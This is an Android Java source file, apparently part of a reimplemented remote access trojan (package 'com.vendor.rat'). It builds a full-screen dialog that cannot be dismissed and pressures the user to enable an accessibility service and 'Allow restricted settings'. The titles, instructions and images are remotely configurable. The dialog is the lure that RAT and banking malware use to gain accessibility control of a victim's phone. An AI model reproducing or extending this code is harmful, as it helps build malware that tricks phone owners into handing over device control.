package com.vendor.rat.helper;

import android.app.Activity;
import android.app.Dialog;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.vendor.rat.config.AppConfig;

import java.lang.ref.WeakReference;

/**
 * 引导弹窗 Helper
 *
 * 职责: 构建并管理全屏引导弹窗 (背景图 + 半透明卡片 + 图标/标题/文本/按钮)
 * ADAPT: vendor = utils/b.f() (行 77-104)
 *
 * 全屏方案: Activity 在 Manifest 中声明 Theme.Translucent.NoTitleBar，
 * Dialog 使用 Theme_Black_NoTitleBar_Fullscreen + FLAG_FULLSCREEN，
 * 两者配合实现无状态栏全屏覆盖。
 */
public class GuideDialogHelper {

    private static final String TAG = "GuideDialogHelper";

    private static final String DEFAULT_BG_ASSET = "default_bg.png";
    private static final String DEFAULT_ICO_ASSET = "default_ico.png";

    public static final int COLOR_BG = Color.parseColor("#303133");
    private static final int COLOR_OVERLAY = Color.parseColor("#40000000");
    private static final int COLOR_CARD_BG = Color.parseColor("#66000000");
    private static final int COLOR_DIVIDER = Color.parseColor("#33FFFFFF");
    private static final int COLOR_RESTRICTED = Color.parseColor("#AAAAAA");

    private static WeakReference<Dialog> dialogRef;

    private GuideDialogHelper() {}

    public static void show(Activity activity, AppConfig config, boolean restricted, Runnable onOkClick) {
        if (isShowing()) {
            return;
        }

        String alertTitle = getConfigString(config, AppConfig::getAlertTitle,
                "Open [accessibility_service_label]");
        String alertMsg = getConfigString(config, AppConfig::getAlertMsg,
                "1.Click go immediately and enter accessibility service column\n"
                + "2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n"
                + "3.Find [accessibility_service_label],and click to enter this column\n"
                + "4.Click the switch(in the top right corner),you can open [accessibility_service_label]");
        String okText = getConfigString(config, AppConfig::getOkText, "Go immediately");
        String bgUrl = (config != null) ? config.getGuideDialogBgUrl() : null;
        String icoUrl = (config != null) ? config.getGuideDialogIcoUrl() : null;

        Dialog dialog = new Dialog(activity, android.R.style.Theme_Black_NoTitleBar);
        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);

        FrameLayout root = new FrameLayout(activity);

        // 背景图
        ImageView bgImageView = new ImageView(activity);
        bgImageView.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        bgImageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        bgImageView.setBackgroundColor(COLOR_BG);
        root.addView(bgImageView);
        loadImage(activity, bgUrl, DEFAULT_BG_ASSET, bgImageView);

        // 半透明遮罩
        View overlay = new View(activity);
        overlay.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        overlay.setBackgroundColor(COLOR_OVERLAY);
        root.addView(overlay);

        // 内容层
        LinearLayout contentLayout = new LinearLayout(activity);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setGravity(Gravity.CENTER);
        int padH = dp(activity, 24);
        contentLayout.setPadding(padH, dp(activity, 40), padH, dp(activity, 40));
        root.addView(contentLayout, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        // 卡片
        LinearLayout card = buildCard(activity, alertTitle, alertMsg, icoUrl);
        contentLayout.addView(card, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));

        if (!restricted) {
            String restrictedText = getConfigString(config, AppConfig::getAllowRestricted,
                    "Allow restricted settings");
            addRestrictedButton(activity, card, restrictedText);
        }

        addOkButton(activity, card, okText, onOkClick);

        dialog.setContentView(root);
        if (dialog.getWindow() != null) {
            android.view.Window window = dialog.getWindow();
            window.setLayout(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT);
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            // 状态栏透明，内容延伸到状态栏下方（不隐藏状态栏）
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.setStatusBarColor(Color.TRANSPARENT);
            window.setNavigationBarColor(Color.TRANSPARENT);
            window.getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
        }

        dialogRef = new WeakReference<>(dialog);
        dialog.show();
    }

    public static void dismiss() {
        WeakReference<Dialog> ref = dialogRef;
        if (ref == null || ref.get() == null) {
            return;
        }
        try {
            Dialog d = ref.get();
            if (d.isShowing()) {
                d.dismiss();
            }
        } catch (Exception e) {
            // Window not attached — safe to ignore
        }
        dialogRef = null;
    }

    public static boolean isShowing() {
        WeakReference<Dialog> ref = dialogRef;
        return ref != null && ref.get() != null && ref.get().isShowing();
    }

    // ============ 内部构建方法 ============

    private static LinearLayout buildCard(Activity activity, String title, String message, String icoUrl) {
        LinearLayout card = new LinearLayout(activity);
        card.setOrientation(LinearLayout.VERTICAL);
        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(COLOR_CARD_BG);
        cardBg.setCornerRadius(dp(activity, 16));
        card.setBackground(cardBg);
        int pad = dp(activity, 24);
        card.setPadding(pad, pad, pad, pad);

        // 标题行
        LinearLayout titleRow = new LinearLayout(activity);
        titleRow.setOrientation(LinearLayout.HORIZONTAL);
        titleRow.setGravity(Gravity.CENTER_VERTICAL);

        ImageView icoView = new ImageView(activity);
        int icoSize = dp(activity, 32);
        icoView.setLayoutParams(new LinearLayout.LayoutParams(icoSize, icoSize));
        icoView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        titleRow.addView(icoView);
        loadImage(activity, icoUrl, DEFAULT_ICO_ASSET, icoView);

        TextView titleView = new TextView(activity);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        titleParams.setMarginStart(dp(activity, 10));
        titleView.setLayoutParams(titleParams);
        titleView.setText(title);
        titleView.setTextColor(Color.WHITE);
        titleView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
        titleView.getPaint().setFakeBoldText(true);
        titleRow.addView(titleView);
        card.addView(titleRow);

        // 分隔线
        View divider = new View(activity);
        LinearLayout.LayoutParams divParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(activity, 1));
        divParams.setMargins(0, dp(activity, 16), 0, dp(activity, 16));
        divider.setBackgroundColor(COLOR_DIVIDER);
        card.addView(divider, divParams);

        // 引导文本
        TextView msgView = new TextView(activity);
        msgView.setText(message);
        msgView.setTextColor(Color.WHITE);
        msgView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        msgView.setLineSpacing(dp(activity, 4), 1.0f);
        card.addView(msgView);

        return card;
    }

    private static void addRestrictedButton(Activity activity, LinearLayout card, String text) {
        TextView btn = new TextView(activity);
        btn.setText(text);
        btn.setTextColor(COLOR_RESTRICTED);
        btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(0, dp(activity, 12), 0, 0);
        btn.setOnClickListener(v -> Log.d(TAG, "Allow restricted settings clicked"));
        card.addView(btn);
    }

    private static void addOkButton(Activity activity, LinearLayout card, String text, Runnable onClick) {
        Button btn = new Button(activity);
        btn.setText(text);
        btn.setTextColor(COLOR_BG);
        btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        btn.setAllCaps(false);

        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.WHITE);
        bg.setCornerRadius(dp(activity, 20));
        btn.setBackground(bg);
        btn.setPadding(dp(activity, 24), 0, dp(activity, 24), 0);

        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, dp(activity, 40));
        params.gravity = Gravity.END;
        params.setMargins(0, dp(activity, 20), 0, 0);
        btn.setLayoutParams(params);
        btn.setOnClickListener(v -> {
            if (onClick != null) onClick.run();
        });
        card.addView(btn);
    }

    // ============ 图片加载 ============

    static void loadImage(Activity activity, String url, String defaultAsset, ImageView target) {
        // 代理到 BlockImageLoader，避免重复实现
        BlockImageLoader.loadImage(activity, url, defaultAsset, target);
    }

    // ============ 工具方法 ============

    static int dp(Activity activity, int value) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP, value, activity.getResources().getDisplayMetrics());
    }

    @FunctionalInterface
    private interface ConfigGetter {
        String get(AppConfig config);
    }

    private static String getConfigString(AppConfig config, ConfigGetter getter, String defaultValue) {
        if (config == null) return defaultValue;
        String value = getter.get(config);
        return (value == null || value.isEmpty()) ? defaultValue : value;
    }
}
